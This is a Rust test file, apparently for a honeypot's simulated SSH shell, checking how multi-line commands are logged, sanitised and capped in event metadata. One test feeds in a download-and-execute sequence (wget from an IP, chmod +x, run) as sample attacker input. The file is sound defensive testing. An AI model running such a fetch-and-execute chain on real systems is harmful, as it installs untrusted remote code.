//! `metadata.command_lines`: a multi-line command keeps its line breaks beside the collapsed
//! `metadata.command`, and a single-line command carries nothing extra.

use crate::fakefs::FakeFs;
use crate::shell::{EmitContext, FakeShell, MAX_COMMAND_LEN, MAX_COMMAND_LINES};

fn exec_shell() -> FakeShell {
    FakeShell::exec(
        FakeFs::new(),
        EmitContext {
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: None,
            authenticated: true,
            protocol_label: "ssh".to_string(),
            session_id: None,
        },
    )
}

/// The command event's metadata for one exec string.
fn metadata(line: &str) -> serde_json::Value {
    let (_, events) = exec_shell().handle_input(line);
    events[0].metadata.clone()
}

fn lines(md: &serde_json::Value) -> Vec<String> {
    md["command_lines"]
        .as_array()
        .expect("command_lines present")
        .iter()
        .map(|v| v.as_str().unwrap().to_string())
        .collect()
}

#[test]
fn a_multi_line_command_keeps_each_line_and_collapses_command() {
    let md = metadata("cd /tmp\nwget http://198.51.100.9/x\nchmod +x x\n./x");
    assert_eq!(
        lines(&md),
        ["cd /tmp", "wget http://198.51.100.9/x", "chmod +x x", "./x"]
    );
    assert_eq!(
        md["command"], "cd /tmp wget http://198.51.100.9/x chmod +x x ./x",
        "`command` stays the collapsed form every other reader keys on"
    );
    assert!(md.get("command_lines_truncated").is_none());
}

#[test]
fn a_single_line_command_carries_no_lines_key() {
    assert!(metadata("uname -a").get("command_lines").is_none());
    // One trailing terminator is not a line break inside the command.
    assert!(metadata("uname -a\n").get("command_lines").is_none());
    assert!(metadata("uname -a\r\n").get("command_lines").is_none());
}

#[test]
fn crlf_and_bare_cr_are_one_break_each_and_blank_lines_stay() {
    let md = metadata("echo one\r\necho two\recho three\n\necho four");
    assert_eq!(
        lines(&md),
        ["echo one", "echo two", "echo three", "", "echo four"]
    );
}

#[test]
fn each_line_is_sanitized_not_just_the_whole() {
    let md = metadata("echo \u{1b}[31mred\u{1b}[0m\necho \u{202e}x");
    assert_eq!(lines(&md), ["echo red", "echo x"]);
}

#[test]
fn lines_beyond_the_count_cap_are_dropped_and_flagged() {
    let script = (0..MAX_COMMAND_LINES + 5)
        .map(|i| format!("l{i}"))
        .collect::<Vec<_>>()
        .join("\n");
    let md = metadata(&script);
    assert_eq!(lines(&md).len(), MAX_COMMAND_LINES);
    assert_eq!(md["command_lines_truncated"], true);
}

#[test]
fn the_lines_together_stay_within_the_command_length_cap() {
    let long = "x".repeat(MAX_COMMAND_LEN / 2 + 100);
    let md = metadata(&format!("{long}\n{long}\n{long}"));
    let kept = lines(&md);
    let total: usize = kept.iter().map(String::len).sum();
    assert!(total <= MAX_COMMAND_LEN, "{total}");
    assert_eq!(kept[0], long, "an earlier line is whole while room remains");
    assert!(
        kept[1].len() < long.len(),
        "the line that crossed the cap is cut"
    );
    assert_eq!(md["command_lines_truncated"], true);
}

#[test]
fn a_script_exactly_at_the_cap_is_not_flagged() {
    let md = metadata(&format!("{}\n{}", "a".repeat(512), "b".repeat(512)));
    assert_eq!(lines(&md).iter().map(String::len).sum::<usize>(), 1024);
    assert!(md.get("command_lines_truncated").is_none());
}
